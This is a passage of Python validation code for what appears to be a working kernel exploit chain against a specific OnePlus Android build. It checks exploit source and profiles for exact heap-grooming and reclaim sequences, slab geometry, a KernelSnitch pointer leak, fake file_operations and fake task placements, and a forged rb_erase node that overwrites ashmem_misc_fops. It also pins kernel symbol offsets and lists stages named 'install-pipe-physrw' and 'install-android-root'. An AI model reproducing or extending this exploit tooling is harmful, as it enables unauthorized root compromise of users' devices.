        sources, profile_gate, evidence, evidence_sha256
    ):
        raise RuntimeError("negative KernelSnitch route-gate profile passed")
    evidence_gate = copy.deepcopy(evidence)
    evidence_gate["stage_mismatch"]["route_decision_supported"] = True
    if not pad3_kernelsnitch_diagnostic_contract_errors(
        sources, diagnostic, evidence_gate, evidence_sha256
    ):
        raise RuntimeError("negative KernelSnitch stage-mismatch evidence passed")
    evidence_separation = copy.deepcopy(evidence)
    evidence_separation["fops_stage_descriptive_separation"][
        "not_a_slide_classifier"
    ] = False
    if not pad3_kernelsnitch_diagnostic_contract_errors(
        sources, diagnostic, evidence_separation, evidence_sha256
    ):
        raise RuntimeError("negative FOPS-stage separation evidence passed")
    hash_fixture = copy.deepcopy(diagnostic)
    hash_fixture["evidence_sha256"] = "0" * 64
    if not pad3_kernelsnitch_diagnostic_contract_errors(
        sources, hash_fixture, evidence, evidence_sha256
    ):
        raise RuntimeError("negative KernelSnitch evidence-hash fixture passed")
    return len(mutations) + 4


def reclaim_profile_contract_errors(
    reclaim: object, evidence: object
) -> list[str]:
    """Validate the committed Pad 3 allocator evidence and arithmetic model."""

    errors: list[str] = []
    if not isinstance(reclaim, dict):
        return ["profile has no reclaim_hardening object"]
    if not isinstance(evidence, dict):
        return ["profile has no reclaim evidence object"]

    exact = {
        "status": (
            "exact-btf-config-oss-live-slabinfo-verified-proven-four-send-"
            "head-guard-pending-runtime-rerun"
        ),
        "target_only_feature_macro": "SKB_RECLAIM_PAD3_HARDENING",
        "target_only_feature_value": 1,
        "legacy_core66_send_default": 4,
        "reclaim_sends": 4,
    }
    for key, expected in exact.items():
        if reclaim.get(key) != expected:
            errors.append(f"reclaim_hardening.{key} is not exact")

    numeric = {
        "skb_shared_info_size": 0x168,
        "skb_shared_info_aligned": 0x180,
        "sk_buff_aligned": 0x100,
        "max_linear_head": 0xE80,
        "reclaim_payload_size": 0x8E80,
        "order3_fragment_size": 0x8000,
        "reclaim_skb_truesize": 0x9100,
        "minimum_effective_sndbuf": 0x24401,
    }
    for key, expected in numeric.items():
        try:
            actual = profile_int(reclaim, key)
        except (KeyError, ValueError):
            errors.append(f"reclaim_hardening.{key} is invalid")
            continue
        if actual != expected:
            errors.append(
                f"reclaim_hardening.{key}={actual:#x}, expected={expected:#x}"
            )

    # Host model of the exact OSS/BTF formulas.
    align = lambda value, boundary: (value + boundary - 1) & -boundary
    shinfo = align(0x168, 64)
    skb = align(0xF0, 64)
    max_head = 4096 - shinfo
    head_truesize = max_head + skb + shinfo
    reclaim_truesize = head_truesize + (4096 << 3)
    minimum_sndbuf = 4 * reclaim_truesize + 1
    modeled = {
        "skb_shared_info_aligned": shinfo,
        "sk_buff_aligned": skb,
        "max_linear_head": max_head,
        "reclaim_skb_truesize": reclaim_truesize,
        "minimum_effective_sndbuf": minimum_sndbuf,
    }
    for key, expected in modeled.items():
        try:
            actual = profile_int(reclaim, key)
        except (KeyError, ValueError):
            continue
        if actual != expected:
            errors.append(f"host reclaim model disagrees with {key}")

    guard = reclaim.get("head_guard")
    expected_guard = {
        "cache": "kmalloc-cg-4k",
        "send_size": "0xe80",
        "slab_order": 3,
        "objects_per_slab": 8,
        "groups": 1,
        "sends_per_group": 8,
        "total_heads_allocated_before_any_free": 8,
        "synchronous_frees_per_group": 4,
        "total_synchronous_frees": 4,
        "queued_holders_per_group": 4,
        "total_queued_holders_during_reclaim": 4,
        "allocation_order": "one-group-send-eight-before-receiving-four",
        "same_cpu": 0,
    }
    if not isinstance(guard, dict):
        errors.append("reclaim_hardening has no head_guard object")
    else:
        for key, expected in expected_guard.items():
            if guard.get(key) != expected:
                errors.append(f"head_guard.{key} is not exact")

    leak = reclaim.get("mm_leak_gate")
    expected_leak = {
        "direct_alias_start": "0xffffff8000000000",
        "direct_alias_end": "0xffffff8c00000000",
        "object_size": "0x500",
        "objects_per_slab": 25,
        "require_exact_slot_alignment": True,
        "exclusive_adjacency_sequence": (
            "pre24-leak-parked-post25-then-release-after-all-mm-pins"
        ),
    }
    if not isinstance(leak, dict):
        errors.append("reclaim_hardening has no mm_leak_gate object")
    else:
        for key, expected in expected_leak.items():
            if leak.get(key) != expected:
                errors.append(f"mm_leak_gate.{key} is not exact")
    if (4096 << 3) // 0x500 != 25:
        errors.append("host mm slab model no longer yields 25 slots")

    placements = reclaim.get("fragment_placements")
    if placements != {
        "lock": "0x0",
        "fops": "0x100",
        "w0": "0x300",
        "fake_task": "0x400",
    }:
        errors.append("reclaim fragment placements are not exact")

    oss = evidence.get("oss")
    if not isinstance(oss, dict) or oss.get("commit") != (
        "a28bd5b70ee5ba6e9d24489f20b9c4ac2872f9ec"
    ):
        errors.append("reclaim evidence does not pin the matching OnePlus OSS commit")
    extracted = evidence.get("extracted_kernel")
    if not isinstance(extracted, dict) or any(
        extracted.get(key) != expected
        for key, expected in {
            "skb_shared_info_size": 0x168,
            "sk_buff_size": 0xF0,
            "cache_line_size": 64,
        }.items()
    ):
        errors.append("reclaim evidence BTF sizes are not exact")
    slab = evidence.get("live_slabinfo")
    if not isinstance(slab, dict) or any(
        slab.get(key) != expected
        for key, expected in {
            "cache": "kmalloc-cg-4k",
            "object_size": 4096,
            "objects_per_slab": 8,
            "pages_per_slab": 8,
        }.items()
    ):
        errors.append("reclaim evidence slab geometry is not exact")
    else:
        captures = slab.get("captures")
        if not isinstance(captures, list) or len(captures) < 3:
            errors.append("reclaim evidence needs at least three slabinfo captures")
        else:
            for capture in captures:
                if not isinstance(capture, dict) or not re.fullmatch(
                    r"[0-9a-f]{64}", str(capture.get("bugreport_sha256", ""))
                ):
                    errors.append("reclaim slabinfo capture hash is invalid")
                    continue
                fields = str(capture.get("line", "")).split()
                if len(fields) < 6 or fields[0] != "kmalloc-cg-4k" or (
                    fields[3:6] != ["4096", "8", "8"]
                ):
                    errors.append("reclaim slabinfo capture line is not exact")
    head_evidence = evidence.get("head_guard_contract")
    if head_evidence != {
        "decision": (
            "restore the target-only four-send geometry that produced three "
            "FOPS hits in three observed runs; the twelve-send geometry "
            "produced one hit and multiple misses and can self-contaminate the "
            "second allocator phase"
        ),
        "allocation_sequence": [
            "group-0-send-8",
            "group-0-recv-4",
        ],
        "groups": 1,
        "heads_allocated_before_any_free": 8,
        "free_heads_retained_for_reclaim": 4,
        "live_heads_retained_through_all_reclaim_sends": 4,
        "reclaim_sends": 4,
        "per_group_queue_bytes_during_reclaim": "0x3a00",
        "runtime_status": "pending-exact-device-rerun",
    }:
        errors.append("reclaim evidence proven four-send head guard is not exact")
    ready = evidence.get("pselect_expected_ready_observations")
    if not isinstance(ready, dict) or ready.get("value") != 8 or (
        ready.get("diagnostic_only") is not True
    ):
        errors.append("expected-ready evidence is not diagnostic-only exact 8")
    elif len(set(ready.get("distinct_log_sha256", []))) < 6:
        errors.append("expected-ready diagnostic lacks repeated distinct hits")
    return errors


def pad3_reclaim_source_contract_errors(
    sources: dict[str, str], reclaim: object, evidence: object
) -> list[str]:
    """Enforce Pad3-only reclaim hardening and preserve legacy core66 defaults."""

    errors = reclaim_profile_contract_errors(reclaim, evidence)
    normalized = {name: normalized_source(text) for name, text in sources.items()}
    common = normalized.get("common", "")
    common_raw = normalized.get("common_raw", "")
    target = normalized.get("target_raw", "")
    util = normalized.get("util", "")
    prepare = c_function_body(util, "prepare_kernel_page")
    head = c_function_body(util, "pad3_prepare_head_guards")
    head_intact = c_function_body(util, "pad3_head_guards_intact")
    head_close = c_function_body(util, "pad3_close_head_guards")
    capacity = c_function_body(util, "pad3_reclaim_capacity_exact")
    metadata = c_function_body(util, "pad3_socketpair_metadata_exact")
    fops = normalized.get("fops", "")
    fops_raw = normalized.get("fops_raw", "")
    route = c_function_body(fops, "do_pselect_fake_lock_route")

    legacy_patterns = (
        r"#ifndef SKB_RECLAIM_SENDS #define SKB_RECLAIM_SENDS 4 #endif",
        r"#ifndef SKB_RECLAIM_SNDBUF #define SKB_RECLAIM_SNDBUF \(1 << 20\) #endif",
        r"#ifndef SKB_RECLAIM_PAD3_HARDENING #define SKB_RECLAIM_PAD3_HARDENING 0 #endif",
    )
    for pattern in legacy_patterns:
        if not re.search(pattern, common_raw):
            errors.append(f"legacy core66 default/scope is missing: {pattern}")

    target_needles = (
        "#define SKB_RECLAIM_PAD3_HARDENING 1",
        "#define SKB_RECLAIM_SENDS 4",
        "#define SKB_RECLAIM_SNDBUF (1 << 20)",
        "#define SKB_RECLAIM_TRUESIZE 0x9100",
        "#define SKB_RECLAIM_MIN_EFFECTIVE_SNDBUF 0x24401",
        "#define SKB_HEAD_GUARD_GROUPS 1",
        "#define SKB_HEAD_GUARD_SENDS 8",
        "#define SKB_HEAD_GUARD_FREES 4",
        "#define SKB_HEAD_GUARD_HOLDERS 4",
        "#define PSELECT_EXPECTED_READY 8",
    )
    for needle in target_needles:
        if needle not in target:
            errors.append(f"Pad 3 target reclaim contract omits {needle!r}")
    kphys_guard = (
        "#if defined(KPHYS_RUNTIME_LIVE_VALIDATION) && \\ "
        "KPHYS_RUNTIME_LIVE_VALIDATION static int "
        "validate_runtime_kernel_phys_variables(int fd)"
    )
    if kphys_guard not in fops_raw:
        errors.append("Pad 3 runtime KPHYS helper is not feature-scope guarded")

    assert_needles = (
        "_Static_assert(SKB_RECLAIM_SENDS == 4",
        "_Static_assert(SKB_RECLAIM_TRUESIZE ==",
        "_Static_assert(SKB_RECLAIM_MIN_EFFECTIVE_SNDBUF ==",
        "_Static_assert(SKB_HEAD_GUARD_GROUPS == 1",
        "SKB_HEAD_GUARD_GROUPS * SKB_HEAD_GUARD_FREES >= SKB_RECLAIM_SENDS",
        "SKB_HEAD_GUARD_GROUPS * SKB_HEAD_GUARD_HOLDERS >= SKB_RECLAIM_SENDS",
        "_Static_assert(ORDER3_SIZE / MM_STRUCT_SZ == 25",
        "_Static_assert(LOCK_OFF + SKB_DATA_DELTA == 0x000",
        "_Static_assert(FOPS_OFF + SKB_DATA_DELTA == 0x100",
        "_Static_assert(W0_OFF + SKB_DATA_DELTA == 0x300",
        "_Static_assert(FAKE_TASK_OFF + SKB_DATA_DELTA == 0x400",
    )
    for needle in assert_needles:
        if needle not in common:
            errors.append(f"Pad 3 common reclaim assert omits {needle!r}")

    head_needles = (
        "sched_getcpu() != CORE",
        "socketpair(AF_UNIX, SOCK_STREAM, 0, sv[group])",
        "SKB_HEAD_GUARD_SENDS * (SKB_RECLAIM_TRUESIZE - ORDER3_SIZE) + 1",
        ".iov_len = SKB_RECLAIM_HEAD_ONLY_SIZE",
        "for (int group = 0; group < SKB_HEAD_GUARD_GROUPS; group++)",
        "for (int i = 0; i < SKB_HEAD_GUARD_SENDS; i++)",
        "sendmsg(sv[group][0], &msg, MSG_DONTWAIT)",
        "sent != (ssize_t)SKB_RECLAIM_HEAD_ONLY_SIZE",
        "for (int i = 0; i < SKB_HEAD_GUARD_FREES; i++)",
        "recv(sv[group][1], skb_buf, SKB_RECLAIM_HEAD_ONLY_SIZE, MSG_WAITALL)",
        "received != (ssize_t)SKB_RECLAIM_HEAD_ONLY_SIZE",
        "pad3_head_guards_intact(sv)",
        "groups=1 sends=8 frees=4 holders=4",
        "per-group=8/4/4 head=0xe80",
    )
    for needle in head_needles:
        if needle not in head:
            errors.append(f"Pad 3 head guard omits {needle!r}")
    for needle in ("SO_TYPE", "SO_DOMAIN", "SOCK_STREAM", "AF_UNIX"):
        if needle not in metadata:
            errors.append(f"Pad 3 socket metadata gate omits {needle!r}")
    for needle in (
        "for (int group = 0; group < SKB_HEAD_GUARD_GROUPS; group++)",
        "ioctl(sv[group][1], FIONREAD, &queued)",
        "queued != expected",
    ):
        if needle not in head_intact:
            errors.append(f"Pad 3 aggregate head guard check omits {needle!r}")
    for needle in (
        "for (int group = 0; group < SKB_HEAD_GUARD_GROUPS; group++)",
        "pad3_close_socketpair(sv[group])",
    ):
        if needle not in head_close:
            errors.append(f"Pad 3 aggregate head guard close omits {needle!r}")
    send_phase = head.find(
        "for (int group = 0; group < SKB_HEAD_GUARD_GROUPS; group++)"
    )
    send_call = head.find("sendmsg(sv[group][0], &msg, MSG_DONTWAIT)", send_phase)
    recv_phase = head.find(
        "for (int group = 0; group < SKB_HEAD_GUARD_GROUPS; group++)",
        send_call + 1,
    )
    recv_call = head.find(
        "recv(sv[group][1], skb_buf, SKB_RECLAIM_HEAD_ONLY_SIZE, MSG_WAITALL)",
        recv_phase,
    )
    if min(send_phase, send_call, recv_phase, recv_call) < 0 or not (
        send_phase < send_call < recv_phase < recv_call
    ):
        errors.append("Pad 3 head guard does not allocate all groups before any free")
    if head.count("sendmsg(sv[group][0], &msg, MSG_DONTWAIT)") != 1 or (
        head.count(
            "recv(sv[group][1], skb_buf, SKB_RECLAIM_HEAD_ONLY_SIZE, MSG_WAITALL)"
        )
        != 1
    ):
        errors.append("Pad 3 head guard has an extra allocation/free phase")
    if head.count("recv(") != 1:
        errors.append("Pad 3 head guard frees a head outside the exact receive phase")
    for needle in (
        "effective_sndbuf < SKB_RECLAIM_MIN_EFFECTIVE_SNDBUF",
        "!(flags & O_NONBLOCK)",
        "reclaim_sockets_intact()",
        "sends=4 truesize=0x9100",
    ):
        if needle not in capacity:
            errors.append(f"Pad 3 reclaim capacity gate omits {needle!r}")

    prepare_needles = (
        "leaked < KERNELSNITCH_IDENTITY_START",
        "leaked >= KERNELSNITCH_IDENTITY_END",
        "slab_off % MM_STRUCT_SZ != 0",
        "leaked_slot >= 25",
        "Pad3 mm leak validated pointer=%016zx base=%016zx off=%04zx",
        "slot=%zu",
        "shaping_sent != (ssize_t)SKB_RECLAIM_SIZE",
        'pad3_socketpair_metadata_exact(pcp_shaping_sv, "PCP shaping")',
        "pin_to_core(CORE)",
        "int head_guard_sv[SKB_HEAD_GUARD_GROUPS][2]",
        "pad3_prepare_head_guards(head_guard_sv)",
        "pad3_head_guards_intact(head_guard_sv)",
        "pad3_reclaim_capacity_exact()",
        "reclaim_results[0] == (ssize_t)SKB_RECLAIM_SIZE",
        "reclaim_results[i] != (ssize_t)SKB_RECLAIM_SIZE",
        "reclaim_sent != SKB_RECLAIM_SENDS",
    )
    for needle in prepare_needles:
        if needle not in prepare:
            errors.append(f"Pad 3 prepare/reclaim path omits {needle!r}")

    target_close = prepare.find("target_close_ret = close(memfd_leak)")
    first_send = prepare.find(
        "reclaim_results[0] = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT)",
        target_close,
    )
    if target_close < 0 or first_send < 0:
        errors.append("Pad 3 target close/first reclaim send is missing")
    else:
        pcp_close = prepare.find("SYSCHK(close(pcp_shaping_sv[1]))")
        if pcp_close < 0 or "sched_yield" in prepare[pcp_close:target_close]:
            errors.append("Pad 3 retains a post-PCP-shaping yield before target free")
        between = prepare[
            target_close + len("target_close_ret = close(memfd_leak);") : first_send
        ].strip()
        if between:
            errors.append(
                "Pad 3 target close is not immediately followed by first reclaim send"
            )
        critical_end = prepare.find(
            "for (int i = 0; i < reclaim_attempted; i++)", first_send
        )
        critical = prepare[target_close:critical_end]
        if "sched_yield" in critical or "pad3_close_head_guards" in critical:
            errors.append("Pad 3 reclaim critical window yields or drops head holders")

    holder_check = prepare.rfind("pad3_head_guards_intact(head_guard_sv)")
    holder_close = prepare.rfind("pad3_close_head_guards(head_guard_sv)")
    last_send = prepare.rfind("sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT)")
    if min(holder_check, holder_close, last_send) < 0 or not (
        last_send < holder_check < holder_close
    ):
        errors.append("Pad 3 head holders do not survive every reclaim send")

    mode4_receipt_blocks = c_if_blocks(route, r"custom_mode\s*==\s*4")
    if "if (ret != PSELECT_EXPECTED_READY)" not in route or not any(
        "if (try_cfi_stage())" in block for block in mode4_receipt_blocks
    ):
        errors.append("expected-ready diagnostic weakened the actual CFI receipt gate")
    route_signal_assignment = re.search(r"route_signal\s*=([^;]+);", route)
    if route_signal_assignment and (
        "PSELECT_EXPECTED_READY" in route_signal_assignment.group(1)
    ):
        errors.append("expected-ready diagnostic became a route success signal")
    return errors


def run_pad3_reclaim_negative_fixtures(
    sources: dict[str, str], reclaim: object, evidence: object
) -> int:
    if pad3_reclaim_source_contract_errors(sources, reclaim, evidence):
        raise RuntimeError("positive Pad 3 reclaim source contract was rejected")

    mutations: dict[str, tuple[str, str, str]] = {
        "legacy-default-not-four": (
            "common_raw", "#define SKB_RECLAIM_SENDS 4", "#define SKB_RECLAIM_SENDS 12"
        ),
        "target-not-four": (
            "target_raw", "#define SKB_RECLAIM_SENDS 4", "#define SKB_RECLAIM_SENDS 5"
        ),
        "head-groups-expanded": (
            "target_raw", "#define SKB_HEAD_GUARD_GROUPS 1", "#define SKB_HEAD_GUARD_GROUPS 3"
        ),
        "head-free-before-all-groups-allocated": (
            "util",
            "msg.msg_iovlen = 1; for (int group = 0; group < SKB_HEAD_GUARD_GROUPS; group++) {",
            "msg.msg_iovlen = 1; recv(sv[0][1], skb_buf, "
            "SKB_RECLAIM_HEAD_ONLY_SIZE, MSG_WAITALL); for (int group = 0; "
            "group < SKB_HEAD_GUARD_GROUPS; group++) {",
        ),
        "capacity-weakened": (
            "util",
            "effective_sndbuf < SKB_RECLAIM_MIN_EFFECTIVE_SNDBUF",
            "effective_sndbuf < 1",
        ),
        "head-send-short-accepted": (
            "util",
            "sent != (ssize_t)SKB_RECLAIM_HEAD_ONLY_SIZE",
            "sent == (ssize_t)SKB_RECLAIM_HEAD_ONLY_SIZE",
        ),
        "head-recv-short-accepted": (
            "util",
            "received != (ssize_t)SKB_RECLAIM_HEAD_ONLY_SIZE",
            "received == (ssize_t)SKB_RECLAIM_HEAD_ONLY_SIZE",
        ),
        "socket-domain-not-gated": (
            "util",
            "getsockopt(sv[i], SOL_SOCKET, SO_DOMAIN, &domain, &domain_len)",
            "getsockopt(sv[i], SOL_SOCKET, SO_PROTOCOL, &domain, &domain_len)",
        ),
        "mm-slot-alignment-omitted": (
            "util", "slab_off % MM_STRUCT_SZ != 0", "slab_off % MM_STRUCT_SZ == 0"
        ),
        "first-reclaim-short-accepted": (
            "util",
            "reclaim_results[0] == (ssize_t)SKB_RECLAIM_SIZE",
            "reclaim_results[0] != (ssize_t)SKB_RECLAIM_SIZE",
        ),
        "middle-reclaim-short-accepted": (
            "util",
            "reclaim_results[i] != (ssize_t)SKB_RECLAIM_SIZE",
            "reclaim_results[i] == (ssize_t)SKB_RECLAIM_SIZE",
        ),
        "last-reclaim-count-accepted": (
            "util",
            "reclaim_sent != SKB_RECLAIM_SENDS",
            "reclaim_sent < SKB_RECLAIM_SENDS - 1",
        ),
        "work-between-target-close-and-send": (
            "util",
            "target_close_ret = close(memfd_leak); reclaim_results[0] = sendmsg",
            "target_close_ret = close(memfd_leak); sched_yield(); reclaim_results[0] = sendmsg",
        ),
        "holders-dropped-before-target": (
            "util",
            "reclaim_results[0] = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT)",
            "reclaim_results[0] = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT); pad3_close_head_guards(head_guard_sv)",
        ),
        "one-guard-group-not-validated": (
            "util",
            "for (int group = 0; group < SKB_HEAD_GUARD_GROUPS; group++) { int queued = -1;",
            "for (int group = 0; group < SKB_HEAD_GUARD_GROUPS - 1; group++) { int queued = -1;",
        ),
        "pcp-shape-not-exact": (
            "util",
            "shaping_sent != (ssize_t)SKB_RECLAIM_SIZE",
            "shaping_sent < 0",
        ),
        "frag-fops-assert-drift": (
            "common",
            "_Static_assert(FOPS_OFF + SKB_DATA_DELTA == 0x100",
            "_Static_assert(FOPS_OFF + SKB_DATA_DELTA == 0x180",
        ),
        "diagnostic-restored-to-nine": (
            "target_raw",
            "#define PSELECT_EXPECTED_READY 8",
            "#define PSELECT_EXPECTED_READY 9",
        ),
        "receipt-gate-removed": (
            "fops", "if (try_cfi_stage())", "if (ret == PSELECT_EXPECTED_READY)"
        ),
        "kphys-helper-unconditionally-compiled": (
            "fops_raw",
            "#if defined(KPHYS_RUNTIME_LIVE_VALIDATION) && \\ KPHYS_RUNTIME_LIVE_VALIDATION static int validate_runtime_kernel_phys_variables(int fd)",
            "#if 1 static int validate_runtime_kernel_phys_variables(int fd)",
        ),
    }
    for name, (source_name, old, new) in mutations.items():
        fixture = copy.deepcopy(sources)
        text = normalized_source(fixture[source_name])
        if old not in text:
            raise RuntimeError(
                f"cannot construct Pad 3 reclaim source fixture {name}: {old!r}"
            )
        if name == "supervisor-sigpipe-block-removed":
            fixture[source_name] = text.replace(old, new)
        else:
            fixture[source_name] = text.replace(old, new, 1)
        if not pad3_reclaim_source_contract_errors(fixture, reclaim, evidence):
            raise RuntimeError(f"negative Pad 3 reclaim source fixture passed: {name}")

    if not isinstance(reclaim, dict):
        raise RuntimeError("cannot construct Pad 3 reclaim profile fixture")
    profile_fixture = copy.deepcopy(reclaim)
    profile_fixture["minimum_effective_sndbuf"] = "0x6cc00"
    if not pad3_reclaim_source_contract_errors(
        sources, profile_fixture, evidence
    ):
        raise RuntimeError("negative Pad 3 reclaim model fixture passed: capacity")
    return len(mutations) + 1


def mode4_profile_contract_errors(route: object) -> list[str]:
    errors: list[str] = []
    if not isinstance(route, dict):
        return ["profile has no fops_mode4_route object"]

    descriptors = {
        "status": "exact-vmlinux-btf-rb-erase-verified-pending-runtime-rerun",
        "mode": 4,
        "erase_case": "one-right-child-red-node",
        "node_parent": "fake_fops",
        "node_right": "ashmem_misc_fops",
        "node_left": "null",
        "fake_task_pi_root": "null",
        "fake_task_pi_leftmost": "null",
        "rb_cached_leftmost": "null-skip-rb_next",
        "waiter_task": "canonical-init_task",
        "pi_top_task": "canonical-init_task",
        "only_erase_collateral": "fake_fops.llseek",
        "collateral_repair": "noop_llseek-exact-readback-before-fake-fops-use",
        "runtime_layout_override": False,
    }
    for key, expected in descriptors.items():
        if route.get(key) != expected:
            errors.append(f"fops_mode4_route.{key} is not exact")

    numeric = {
        "owner_before": 0,
        "owner_after": 0,
        "collateral_offset": 8,
        "rb_erase_offset": 0x01043EAC,
        "rb_erase_cached_offset": 0x0012A744,
        "rt_mutex_setprio_offset": 0x000F3FD8,
    }
    for key, expected in numeric.items():
        try:
            actual = profile_int(route, key)
        except (KeyError, ValueError):
            errors.append(f"fops_mode4_route.{key} is invalid")
            continue
        if actual != expected:
            errors.append(
                f"fops_mode4_route.{key}={actual:#x}, expected={expected:#x}"
            )

    cleanup = route.get("waiter_cleanup")
    if not isinstance(cleanup, dict):
        errors.append("fops_mode4_route has no waiter_cleanup object")
        return errors
    cleanup_descriptors = {
        "feature_macro": "DIRECT_WAITER_PI_CLEANUP",
        "feature_value": 1,
        "only_write": "task_struct.pi_blocked_on-zero",
        "stable_reads_before": 2,
        "zero_readbacks_after": 2,
        "blocked_on_alignment": 8,
    }
    for key, expected in cleanup_descriptors.items():
        if cleanup.get(key) != expected:
            errors.append(f"waiter_cleanup.{key} is not exact")
    for key, expected in (
        ("task_stack_offset", 0x38),
        ("thread_size", 0x4000),
        ("waiter_footprint", 0x70),
    ):
        try:
            actual = profile_int(cleanup, key)
        except (KeyError, ValueError):
            errors.append(f"waiter_cleanup.{key} is invalid")
            continue
        if actual != expected:
            errors.append(
                f"waiter_cleanup.{key}={actual:#x}, expected={expected:#x}"
            )
    expected_preconditions = [
        "consumer-inflight-zero",
        "pi-lock-zero",
        "pi-root-zero",
        "pi-leftmost-zero",
        "pi-top-zero",
        "stable-task-stack",
        "stable-blocked-on",
        "blocked-on-in-task-stack-window",
    ]
    if cleanup.get("preconditions") != expected_preconditions:
        errors.append("waiter_cleanup.preconditions are not exact or ordered")
    expected_order = [
        "f-pi-chain-unlock",
        "pselect-overlay",
        "consumer-inflight-zero",
        "install-pipe-physrw",
        "waiter-pi-cleanup",
        "install-android-root",
        "ashmem-fops-restore",
        "a3-final-commit",
    ]
    if cleanup.get("ordering") != expected_order:
        errors.append("waiter_cleanup.ordering is not exact")
    return errors


def mode4_rb_erase_case1_errors(shape: dict[str, int]) -> list[str]:
    """Model the exact pinned rb_erase one-right-child/red-node block."""

    errors: list[str] = []
    node = shape["node"]
    fake_fops = shape["fake_fops"]
    target = shape["target"]
    parent_color = shape["parent_color"]
    right = shape["right"]
    left = shape["left"]
    root = shape["root"]
    leftmost = shape["leftmost"]

    if leftmost == node:
        errors.append("rb_erase_cached would call rb_next on the forged W0 node")
    if root != 0 or leftmost != 0:
        errors.append("fake task cached rb root/leftmost are not both zero")
    if parent_color & 3:
        errors.append("forged W0 is not an aligned red rb node")
    if parent_color != fake_fops or right != target or left != 0:
        errors.append("forged W0 is not the owner-safe one-right-child shape")

    memory = {
        fake_fops + 0x00: shape["owner_before"],
        fake_fops + 0x08: shape["llseek_before"],
        fake_fops + 0x10: shape["read_before"],
        target: shape["target_before"],
    }
    writes: list[tuple[int, int]] = []
    parent = parent_color & ~3
    if left != 0 or right == 0 or parent == 0:
        errors.append("shape does not enter the exact one-right-child case1 block")
        return errors

    parent_right_slot = parent + 0x10
    parent_left_slot = parent + 0x08
    slot = parent_right_slot if memory.get(parent_right_slot, 0) == node else parent_left_slot
    memory[slot] = right
    writes.append((slot, right))
    memory[right] = parent_color
    writes.append((right, parent_color))

    if memory.get(fake_fops, 0) != 0:
        errors.append("rb_erase case1 corrupts file_operations.owner")
    if memory.get(target) != fake_fops:
        errors.append("rb_erase case1 does not publish fake_fops to target")
    if memory.get(fake_fops + 0x08) != target:
        errors.append("rb_erase case1 collateral is not fake_fops.llseek")
    if writes != [(fake_fops + 0x08, target), (target, fake_fops)]:
        errors.append("rb_erase case1 has collateral beyond llseek and target")

    noop_llseek = shape["noop_llseek"]
    memory[fake_fops + 0x08] = noop_llseek
    if memory[fake_fops + 0x08] != noop_llseek:
        errors.append("fake_fops.llseek repair/readback failed")
    return errors


def positive_mode4_shape() -> dict[str, int]:
    return {
        "node": 0xFFFFFF8916B81000,
        "fake_fops": 0xFFFFFF8916B82000,
        "target": 0xFFFFFF802A27C528,
        "parent_color": 0xFFFFFF8916B82000,
        "right": 0xFFFFFF802A27C528,
        "left": 0,
        "root": 0,
        "leftmost": 0,
        "owner_before": 0,
        "llseek_before": 0xFFFFFF8916B81028,
        "read_before": 0,
        "target_before": 0xFFFFFFDC9C878000,
        "noop_llseek": 0xFFFFFFDC9C053000,
    }


def run_mode4_model_negative_fixtures() -> int:
    positive = positive_mode4_shape()
    if mode4_rb_erase_case1_errors(positive):
        raise RuntimeError("positive mode4 rb_erase model fixture was rejected")

    old_generic = copy.deepcopy(positive)
    old_generic["parent_color"] = old_generic["target"] - 8
    old_generic["right"] = old_generic["fake_fops"]
    if not mode4_rb_erase_case1_errors(old_generic):
        raise RuntimeError("negative mode4 model passed: old-generic-owner-clobber")

    cached_w0 = copy.deepcopy(positive)
    cached_w0["root"] = cached_w0["node"]
    cached_w0["leftmost"] = cached_w0["node"]
    if not mode4_rb_erase_case1_errors(cached_w0):
        raise RuntimeError("negative mode4 model passed: cached-root-leftmost-w0")
    return 2


def pad3_mode4_source_contract_errors(
    sources: dict[str, str], route: object
) -> list[str]:
    """Enforce the OPD2415-only mode4 hybrid and stale PI cleanup."""

    errors = mode4_profile_contract_errors(route)
    normalized = {name: normalized_source(text) for name, text in sources.items()}
    util_source = normalized.get("util", "")
    util = c_function_body(util_source, "prepare_skb_payload")
    fops = normalized.get("fops", "")
    pipe = normalized.get("pipe", "")
    main = normalized.get("main", "")
    root = normalized.get("root", "")
    preload = normalized.get("preload", "")
    preload_raw = normalized.get("preload_raw", "")
    utils_raw = normalized.get("utils_raw", "")
    common_raw = sources.get("common_raw", "")
    root_raw = sources.get("root_raw", "")
    coordinator = c_function_body(normalized.get("main", ""), "run_main_route_threads")

    for source_name, text, needle in (
        ("common/main", normalized.get("common", "") + " " + main, "consumer_quiesced_seq"),
        ("common/main/fops/root", normalized.get("common", "") + " " + main + " " + fops + " " + root, "pi_cleanup_required"),
        ("common/main/fops/root", normalized.get("common", "") + " " + main + " " + fops + " " + root, "pi_cleanup_seq"),
    ):
        if needle not in text:
            errors.append(f"{source_name} omits stale-PI state identifier {needle!r}")

    open_ashmem = c_function_body(util_source, "open_ashmem_device")
    sched_setattr = c_function_body(util_source, "sched_setattr_tid")
    if not open_ashmem:
        errors.append("util open_ashmem_device body is not inspectable")
    else:
        if "return open(ashmem_path, O_RDWR | O_CLOEXEC);" not in open_ashmem:
            errors.append("open_ashmem_device must raw-return open(ashmem_path, O_RDWR | O_CLOEXEC)")
        for forbidden in ("SYSCHK(", "pr_error(", "exit(", "_exit(", "abort("):
            if forbidden in open_ashmem:
                errors.append(f"open_ashmem_device contains fatal token {forbidden!r}")
    if not sched_setattr:
        errors.append("util sched_setattr_tid body is not inspectable")
    else:
        if not source_has_any(
            sched_setattr,
            (
                "long ret = syscall(274, tid, &attr, 0)",
                "long ret = syscall(SYS_sched_setattr, tid, &attr, 0)",
            ),
        ) or "return ret;" not in sched_setattr:
            errors.append("sched_setattr_tid must raw-return the sched_setattr syscall result")
        for forbidden in ("SYSCHK(", "pr_error(", "exit(", "_exit(", "abort("):
            if forbidden in sched_setattr:
                errors.append(f"sched_setattr_tid contains fatal token {forbidden!r}")

    raw_cleanup_sources = common_raw + "\n" + root_raw
    for define, expected in (
        ("ROOT_A2_SNAPSHOT_RETRY_ATTEMPTS", "4"),
        ("ROOT_A2_SNAPSHOT_RETRY_DEADLINE_MS", "500"),
    ):
        if not re.search(
            rf"^[ \t]*#define[ \t]+{define}[ \t]+{expected}[ \t]*(?:/[*].*[*]/)?[ \t]*$",
            raw_cleanup_sources,
            re.MULTILINE,
        ):
            errors.append(f"snapshot retry constant {define} is not exact {expected}")

    mode4_blocks = [
        block
        for block in c_if_blocks(util, r"pselect_custom_write\s*==\s*4")
        if "ASHMEM_MISC_FOPS" in block
    ]
